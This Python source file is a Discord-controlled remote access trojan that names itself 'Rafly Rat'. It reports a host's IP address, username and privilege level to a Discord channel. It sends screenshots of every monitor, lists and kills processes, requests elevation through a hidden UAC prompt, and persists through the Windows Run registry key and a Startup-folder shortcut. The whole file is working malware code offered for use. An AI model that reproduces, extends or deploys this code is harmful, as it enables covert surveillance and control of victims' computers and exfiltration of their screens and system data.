import_errors = []

try:
  import discord
except ImportError:
  import_errors.append("discord module is not available. Please install it using 'pip install discord.py'.")

try:
  import asyncio
except ImportError:
  import_errors.append("asyncio module is not available. Please ensure you are using Python 3.4 or later.")

try:
  import socket
except ImportError:
  import_errors.append("socket module is not available. Please ensure you are using a standard Python distribution.")

try:
  import os
except ImportError:
  import_errors.append("os module is not available. Please ensure you are using a standard Python distribution.")

try:
  import getpass
except ImportError:
  import_errors.append("getpass module is not available. Please ensure you are using a standard Python distribution.")

try:
  import aiohttp
except ImportError:
  import_errors.append("aiohttp module is not available. Please install it using 'pip install aiohttp'.")

try:
  import zipfile
except ImportError:
  import_errors.append("zipfile module is not available. Please ensure you are using a standard Python distribution.")

try:
  import shutil
except ImportError:
  import_errors.append("shutil module is not available. Please ensure you are using a standard Python distribution.")

try:
  import sys
except ImportError:
  import_errors.append("sys module is not available. Please ensure you are using a standard Python distribution.")

try:
  import time
except ImportError:
  import_errors.append("time module is not available. Please ensure you are using a standard Python distribution.")

try:
  import ctypes
except ImportError:
  import_errors.append("ctypes module is not available. Please ensure you are using a standard Python distribution.")

try:
  import threading
except ImportError:
  import_errors.append("threading module is not available. Please ensure you are using a standard Python distribution.")

try:
  import json
except ImportError:
  import_errors.append("json module is not available. Please ensure you are using a standard Python distribution.")

try:
  import uuid
except ImportError:
  import_errors.append("uuid module is not available. Please ensure you are using a standard Python distribution.")

try:
  import subprocess
except ImportError:
  import_errors.append("subprocess module is not available. Please ensure you are using a standard Python distribution.")

try:
  import pyautogui
except ImportError:
  import_errors.append("pyautogui module is not available. Please install it using 'pip install pyautogui'.")

try:
  import psutil
except ImportError:
  import_errors.append("psutil module is not available. Please install it using 'pip install psutil'.")

try:
  import GPUtil
except ImportError:
  import_errors.append("GPUtil module is not available. Please install it using 'pip install gputil'.")

try:
  from screeninfo import get_monitors
except ImportError:
  import_errors.append("screeninfo module is not available. Please install it using 'pip install screeninfo'.")

try:
  import mss
except ImportError:
  import_errors.append("mss module is not available. Please install it using 'pip install mss'.")

try:
  import pythoncom
except ImportError:
  import_errors.append("pythoncom module is not available. Please install it using 'pip install pywin32'.")

try:
  from win32com.client import Dispatch
except ImportError:
  import_errors.append("win32com.client module is not available. Please install it using 'pip install pywin32'.")

try:
  import winreg as reg
except ImportError:
  import_errors.append("winreg module is not available. Please ensure you are using a standard Python distribution on Windows.")

Version = "0.0.5"

# Configuration file path
CONFIG_FILE_PATH = 'config.json'

# Global variables to store the channel ID and bot token
channel_id = None
TOKEN = None
session_id = None

# Command prefix
PREFIX = '!'

script_dir = os.path.dirname(os.path.abspath(__file__))
intents = discord.Intents.default()
intents.message_content = True  # Enable message content intents
client = discord.Client(intents=intents)

async def get_or_create_channel(guild):
  """Check for existing channel ID in config file or create a new session channel."""
  global channel_id, TOKEN
  if os.path.exists(CONFIG_FILE_PATH):
    with open(CONFIG_FILE_PATH, 'r') as config_file:
      config = json.load(config_file)
      channel_id = config.get('channel_id')
      TOKEN = config.get('TOKEN')
      if channel_id:
        channel = guild.get_channel(channel_id)
        if channel:
          return channel

  # Determine the lowest available session number
  session_number = 1
  existing_channels = [channel.name for channel in guild.channels]
  while f'session-{session_number}' in existing_channels:
    session_number += 1

  # Check if the "Sessions" category exists, create if it doesn't
  category = discord.utils.get(guild.categories, name="Sessions")
  if category is None:
    category = await guild.create_category("Sessions")

  # Create a new channel under the "Sessions" category
  new_channel = await guild.create_text_channel(f'session-{session_number}', category=category)

  # Write the new channel ID and bot token to the configuration file
  channel_id = new_channel.id
  with open(CONFIG_FILE_PATH, 'w') as config_file:
    json.dump({'channel_id': channel_id, 'TOKEN': TOKEN, 'session_id': session_id}, config_file)

  return new_channel

async def send_session_message(channel):
  """Send a session message to the specified channel."""
  # Get the IP address of the machine
  hostname = socket.gethostname()
  ip_address = socket.gethostbyname(hostname)

  # Check if the script is running with admin privileges
  is_admin = os.getuid() == 0 if os.name != 'nt' else os.system("net session >nul 2>&1") == 0

  # Create the embed message
  embed = discord.Embed(title="New Session Enabled! 👋", color=0x00ff00)
  embed.add_field(name="IP Address", value=f"```{ip_address}```", inline=False)
  embed.add_field(name="Admin Privileges", value="Yes" if is_admin else "No", inline=False)

  # Send the embed message to the channel
  await channel.send(embed=embed)

async def handle_hello_command(message):
  """Handles the hello command."""
  await message.channel.send('Hello! How can I assist you today?')

async def handle_status_command(message):
  """Handles the status command."""
  # Check if the bot is running with admin privileges
  is_admin = os.getuid() == 0 if os.name != 'nt' else os.system("net session >nul 2>&1") == 0

  # Get system usage statistics
  cpu_usage = psutil.cpu_percent(interval=1)
  ram_usage = psutil.virtual_memory().percent

  # Get GPU usage
  gpus = GPUtil.getGPUs()
  if gpus:
    gpu_usage = f"{gpus[0].load * 100:.2f}%"
  else:
    gpu_usage = "N/A"

  # Create the status embed message
  embed = discord.Embed(title="Status", color=0x00ff00)

  # Add PC status
  embed.add_field(name="CPU Usage", value=f"```{cpu_usage}%```", inline=True)
  embed.add_field(name="RAM Usage", value=f"```{ram_usage}%```", inline=True)
  embed.add_field(name="GPU Usage", value=f"```{gpu_usage}```", inline=True)

  # Get drive usage for all drives
  drives = psutil.disk_partitions()
  for drive in drives:
    if os.name == 'nt':
      if 'cdrom' in drive.opts or drive.fstype == '':
        continue
    drive_usage = psutil.disk_usage(drive.mountpoint)
    total_drive = drive_usage.total / (1024 ** 3)  # Convert bytes to GB
    free_drive = drive_usage.free / (1024 ** 3)  # Convert bytes to GB
    drive_usage_percent = drive_usage.percent

    # Create a bar to represent drive usage
    bar_length = 20
    filled_length = int(bar_length * drive_usage_percent // 100)
    bar = '█' * filled_length + '-' * (bar_length - filled_length)

    embed.add_field(
      name=f"{drive.device} Usage",
      value=f"`[{bar}]`\n```{free_drive:.2f} GB free of {total_drive:.2f} GB```",
      inline=False
    )

  # Add Bot status
  embed.add_field(name="Admin Privileges", value=f"```{'Yes' if is_admin else 'No'}```", inline=True)
  embed.add_field(name="User", value=f"```{getpass.getuser()}```", inline=True)
  embed.add_field(name="Uptime", value=f"```{time.strftime('%H:%M:%S', time.gmtime(time.time() - psutil.boot_time()))}```", inline=False)
  embed.add_field(name="Version", value=f"```{Version}```", inline=True)

  if import_errors:
    error_message = "\n".join(import_errors)
    embed.add_field(name="Errors", value=f"```{error_message}```", inline=False)
  else:
    embed.add_field(name="Errors", value="No errors", inline=False)

  await message.channel.send(embed=embed)

async def handle_help_command(message):
  """Handles the help command."""
  embed = discord.Embed(title="Help - Command List", color=0x00ff00)
  for command, func in command_handlers.items():
    embed.add_field(name=f"!{command}", value=func.__doc__, inline=False)
  await message.channel.send(embed=embed)

async def handle_unknown_command(message):
  """Handles unknown commands."""
  await message.channel.send('I did not understand that command.')

async def handle_update_command(message):
  """Handles the update command."""
  await message.channel.send('Updating the bot...')

  # Save important information to the config file
  save_config()

  # Download the latest release from GitHub
  if await download_latest_release():
    # Restart the bot with the new script
    restart_bot()
  else:
    await message.channel.send('Failed to download the latest release.')

async def download_latest_release():
    """Download the latest release from GitHub and update the bot."""
    url = "https://api.github.com/repos/Blast0ff/Rafly/releases/latest"
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            release_info = await response.json()
            download_url = release_info['zipball_url']
            async with session.get(download_url) as download_response:
                zip_path = os.path.join(script_dir, 'bot.zip')
                with open(zip_path, 'wb') as f:
                    f.write(await download_response.read())

    # Extract the downloaded zip file
    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        zip_ref.extractall(script_dir)
    os.remove(zip_path)

    # Find the extracted folder (it should be the only new folder in the script directory)
    extracted_folder = None
    for item in os.listdir(script_dir):
        item_path = os.path.join(script_dir, item)
        if os.path.isdir(item_path) and item.startswith('Blast0ff-Rafly-'):
            extracted_folder = item_path
            break

    if extracted_folder:
        # Move the contents of the extracted folder to the script directory
        for item in os.listdir(extracted_folder):
            src_path = os.path.join(extracted_folder, item)
            dst_path = os.path.join(script_dir, item)
            if os.path.exists(dst_path) and os.path.samefile(src_path, __file__):
                # Skip moving the current script file
                continue
            shutil.move(src_path, dst_path)
        # Remove the extracted folder
        shutil.rmtree(extracted_folder)

    return True

def show_message_box(content):
  """Displays a message box on the PC running the bot with the provided content."""
  ctypes.windll.user32.MessageBoxW(0, content, "Message Box", 1)

async def handle_message_box_command(message):
  """Handles the 'message box' command."""
  # Ask the user for the message box content
  await message.channel.send("Please provide the content for the message box:")
  
  def check(m):
    return m.author == message.author and m.channel == message.channel

  try:
    # Wait for the user's response
    response = await client.wait_for('message', check=check, timeout=60.0)
    content = response.content

    # Run the show_message_box function in a separate thread with the provided content
    threading.Thread(target=show_message_box, args=(content,)).start()
    
    # Send the message immediately without waiting for the message box to be dismissed
    await message.channel.send("Message box displayed on the PC!")
  except asyncio.TimeoutError:
    await message.channel.send("You took too long to provide the content for the message box.")

def take_screenshot():
    """Take a screenshot and save it to a file."""
    screenshot = pyautogui.screenshot()
    screenshot.save('screenshot.png')

async def handle_screenshot_command(message):
  """Handles the screenshot command."""
  try:
    # Take screenshots of all monitors
    files = []
    with mss.mss() as sct:
      for i, monitor in enumerate(sct.monitors[1:], start=1):  # Skip the first entry which is a virtual monitor
        screenshot = sct.grab(monitor)
        screenshot_path = f'screenshot_monitor_{i}.png'
        mss.tools.to_png(screenshot.rgb, screenshot.size, output=screenshot_path)
        files.append((screenshot_path, discord.File(screenshot_path, filename=screenshot_path)))

    # Send each screenshot as an embedded image
    for screenshot_path, file in files:
      embed = discord.Embed(title=f"Screenshot - Monitor {files.index((screenshot_path, file)) + 1}", color=0x00ff00)
      embed.set_image(url=f"attachment://{screenshot_path}")
      await message.channel.send(file=file, embed=embed)

      # Remove the screenshot file after sending
      os.remove(screenshot_path)
  except Exception as e:
    await message.channel.send(f"An error occurred while taking screenshots: {e}")
    print(f"Error in handle_screenshot_command: {e}")

def uac():
    """Request admin privileges using UAC."""
    if ctypes.windll.shell32.IsUserAnAdmin():
        print("Already running as admin.")
        return True
    else:
        print("Requesting admin privileges...")
        # Hide the console window
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        # Re-run the script with admin privileges and hidden console
        params = ' '.join([f'"{param}"' for param in sys.argv])
        command = f'Start-Process -FilePath "{sys.executable}" -ArgumentList @({params}) -Verb runAs -WindowStyle Hidden'
        try:
            subprocess.run(['powershell', '-Command', command], check=True)
            return True
        except subprocess.CalledProcessError:
            return False

async def handle_uac_command(message):
    """Handles the uac command to request admin privileges."""
    await message.channel.send('Requesting admin privileges...')
    if uac():
        await message.channel.send('Admin privileges granted.')
        sys.exit()  # Exit the current instance to prevent multiple instances
    else:
        await message.channel.send('Admin privileges denied.')

def save_config():
  """Save important information to the config file."""
  with open(CONFIG_FILE_PATH, 'w') as config_file:
    json.dump({'channel_id': channel_id, 'TOKEN': TOKEN, 'session_id': session_id}, config_file)

def prompt_for_token():
  """Prompt the user to input the bot token if it doesn't exist in the config file."""
  global TOKEN
  TOKEN = input("Please enter your bot token: ")
  save_config()

def restart_bot():
  """Restart the bot by closing the script and starting it up again."""
  print("Restarting bot...")
  os.execv(sys.executable, [sys.executable] + sys.argv)

async def handle_restart_command(message):
  """Handles the restart command."""
  await message.channel.send('Restarting bot...')
  restart_bot()

AUTHORIZED_USER_ID = '1283076171533127761'  # Replace with the actual user ID

async def handle_exit_command(message):
    """Handles the exit command."""
    if str(message.author.id) == AUTHORIZED_USER_ID:
        await message.channel.send('Shutting down...')
        await client.close()
    else:
        await message.channel.send('You are not authorized to use this command.')

def add_to_taskmanager_startup():
    """Add the script to the Task Manager startup."""
    script_path = os.path.abspath(__file__)
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    value_name = "RaflyBot"

    try:
        reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(reg_key, value_name, 0, reg.REG_SZ, script_path)
        reg.CloseKey(reg_key)
        print(f"Successfully added to startup: {key}\\{value_name} -> {script_path}")
    except Exception as e:
        print(f"Failed to add to startup: {e}")

async def handle_add_to_taskmanager_startup_command(message):
  """Handles the add to Task Manager startup command."""
  add_to_taskmanager_startup()
  await message.channel.send("Successfully added to Task Manager startup.")

def add_to_startup_folder():
  """Add the script to the Windows startup folder."""
  startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
  script_path = os.path.abspath(__file__)
  shortcut_path = os.path.join(startup_folder, 'RaflyBot.lnk')

  try:
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(shortcut_path)
    shortcut.TargetPath = script_path
    shortcut.WorkingDirectory = os.path.dirname(script_path)
    shortcut.save()
    print("Successfully added to startup folder.")
  except Exception as e:
    print(f"Failed to add to startup folder: {e}")

async def handle_add_to_startup_folder_command(message):
  """Handles the add to startup folder command."""
  add_to_startup_folder()
  await message.channel.send("Successfully added to startup folder.")

def remove_from_taskmanager_startup():
    """Remove the script from the Task Manager startup."""
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    value_name = "RaflyBot"

    try:
        reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
        reg.DeleteValue(reg_key, value_name)
        reg.CloseKey(reg_key)
        print("Successfully removed from Task Manager startup.")
    except FileNotFoundError:
        print("The registry key does not exist.")
    except Exception as e:
        print(f"Failed to remove from Task Manager startup: {e}")

async def handle_remove_from_taskmanager_startup_command(message):
  """Handles the remove from Task Manager startup command."""
  remove_from_taskmanager_startup()
  await message.channel.send("Successfully removed from Task Manager startup.")

def remove_from_startup_folder():
  """Remove the script from the Windows startup folder."""
  startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
  shortcut_path = os.path.join(startup_folder, 'RaflyBot.lnk')

  try:
    if os.path.exists(shortcut_path):
      os.remove(shortcut_path)
      print("Successfully removed from startup folder.")
    else:
      print("Shortcut not found in startup folder.")
  except Exception as e:
    print(f"Failed to remove from startup folder: {e}")

async def handle_remove_from_startup_folder_command(message):
  """Handles the remove from startup folder command."""
  remove_from_startup_folder()
  await message.channel.send("Successfully removed from startup folder.")


def chunk_list(lst, max_chunk_size):
    """Chunks a list into smaller lists of a specified size."""
    chunk = []
    current_size = 0
    for item in lst:
        item_size = len(item) + 1  # +1 for the newline character
        if current_size + item_size > max_chunk_size:
            yield chunk
            chunk = []
            current_size = 0
        chunk.append(item)
        current_size += item_size
    if chunk:
        yield chunk

async def handle_task_kill_command(message):
  """Handles the task kill command."""
  try:
    # Extract the argument from the message content
    args = message.content.split(maxsplit=1)
    if len(args) < 2:
      await message.channel.send("Please provide a PID or task name.")
      return
    
    arg = args[1].strip()
    await message.channel.send(f"Attempting to kill task: {arg}")  # Debug message
    
    # Check if the argument is a PID (number) or a task name (string)
    if arg.isdigit():
      pid = int(arg)
      # Attempt to terminate the process by PID
      proc = psutil.Process(pid)
      proc.terminate()
      await message.channel.send(f"Process with PID {pid} has been terminated.")
    else:
      # Attempt to terminate processes by name
      task_name = arg
      found = False
      for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'].lower() == task_name.lower():
          proc.terminate()
          await message.channel.send(f"Process '{task_name}' with PID {proc.info['pid']} has been terminated.")
          found = True
      if not found:
        await message.channel.send(f"No process found with name '{task_name}'.")
  except (IndexError, ValueError):
    await message.channel.send("Please provide a valid PID or task name.")
  except psutil.NoSuchProcess:
    await message.channel.send(f"No process found with PID {pid}.")
  except psutil.AccessDenied:
    await message.channel.send(f"Access denied to terminate process with PID {pid}.")
  except Exception as e:
    await message.channel.send(f"An error occurred: {str(e)}")
    print(f"Error in handle_task_kill_command: {str(e)}")

async def handle_task_list_command(message):
    """Handles the task list command."""
    apps = []
    background_processes = []
    
    for proc in psutil.process_iter(['pid', 'name', 'username']):
        if proc.info['username'] == psutil.users()[0].name:
            apps.append(f"PID: {proc.info['pid']}, Name: {proc.info['name']}")
        else:
            background_processes.append(f"PID: {proc.info['pid']}, Name: {proc.info['name']}")
    
    max_embed_size = 4096  # Maximum size for embed description
    max_chunk_size = max_embed_size - 200  # Leave some buffer for embed formatting
    
    app_chunks = list(chunk_list(apps, max_chunk_size))
    background_chunks = list(chunk_list(background_processes, max_chunk_size))
    
    # Send app chunks
    for i, chunk in enumerate(app_chunks):
        app_list = "\n".join(chunk)
        embed_apps = discord.Embed(title=f"Apps (Part {i + 1})", description=f"```{app_list}```", color=0x00ff00)
        await message.channel.send(embed=embed_apps)
    
    # Send background process chunks
    for i, chunk in enumerate(background_chunks):
        background_list = "\n".join(chunk)
        embed_background = discord.Embed(title=f"Processes (Part {i + 1})", description=f"```{background_list}```", color=0x00ff00)
        await message.channel.send(embed=embed_background)



# Dictionary to map commands to their corresponding handler functions
command_handlers = {
    'hello': handle_hello_command,
    'status': handle_status_command,
    'add to taskmanager startup': handle_add_to_taskmanager_startup_command,
    'add to startup folder': handle_add_to_startup_folder_command,
    'remove from taskmanager startup': handle_remove_from_taskmanager_startup_command,
    'remove from startup folder': handle_remove_from_startup_folder_command,
    'help': handle_help_command,
    'tasklist': handle_task_list_command,
    'taskkill': handle_task_kill_command,
    'update client': handle_update_command,
    'message box': handle_message_box_command,
    'screenshot': handle_screenshot_command,
    'uac': handle_uac_command,
    'restart bot': handle_restart_command,
    'rb': handle_restart_command,
    'exit': handle_exit_command,
}

def check_existing_session():
  """Check if there is an existing session."""
  if os.path.exists(CONFIG_FILE_PATH):
    with open(CONFIG_FILE_PATH, 'r') as file:
      config = json.load(file)
      if 'session_id' in config:
        return True
  return False

@client.event
async def on_ready():
  """Handles the bot being ready."""
  print(f'Logged in as {client.user.name}')
  
  guild = discord.utils.get(client.guilds)
  channel = await get_or_create_channel(guild)

  # Check for an existing session
  if check_existing_session():
    embed = discord.Embed(title=f"Rafly Rat V: {Version}", color=0x00ff00)
    embed.add_field(name="Status", value="Session online", inline=False)
    embed.add_field(name="User", value=getpass.getuser(), inline=False)
    embed.add_field(name="IP Address", value=socket.gethostbyname(socket.gethostname()), inline=False)
    await channel.send(embed=embed)
  else:
    # Send the session message to the channel
    await send_session_message(channel)
    # Create a new session ID and save it to the config file
    global session_id
    session_id = str(uuid.uuid4())
    with open(CONFIG_FILE_PATH, 'w') as config_file:
      json.dump({'session_id': session_id, 'channel_id': channel_id, 'TOKEN': TOKEN}, config_file)

@client.event
async def on_message(message):
  """Handles incoming messages."""
  global channel_id

  # Ignore messages from the bot itself
  if message.author == client.user:
    return

  # Check if the message is in the specific channel
  if message.channel.id == channel_id:
    # Check if the message starts with the prefix
    if message.content.startswith(PREFIX):
      # Remove the prefix and split the message into command and arguments
      command = message.content[len(PREFIX):].strip().lower()

      # Get the command handler from the dictionary and execute it
      handler = command_handlers.get(command)
      if handler:
        await handler(message)
      else:
        await handle_unknown_command(message)

# Read the bot token from the config file if it exists
if os.path.exists(CONFIG_FILE_PATH):
  with open(CONFIG_FILE_PATH, 'r') as config_file:
    config = json.load(config_file)
    channel_id = config.get('channel_id')
    TOKEN = config.get('TOKEN')
    session_id = config.get('session_id')

# Prompt for the token if it wasn't found in the config file
if not TOKEN:
  prompt_for_token()

# Ensure the TOKEN is not None before running the bot
if TOKEN:
  try:
    client.run(TOKEN)
  except Exception as e:
    print(f"Error running the bot: {e}")
else:
  print("Bot token is not set. Please check the configuration file.")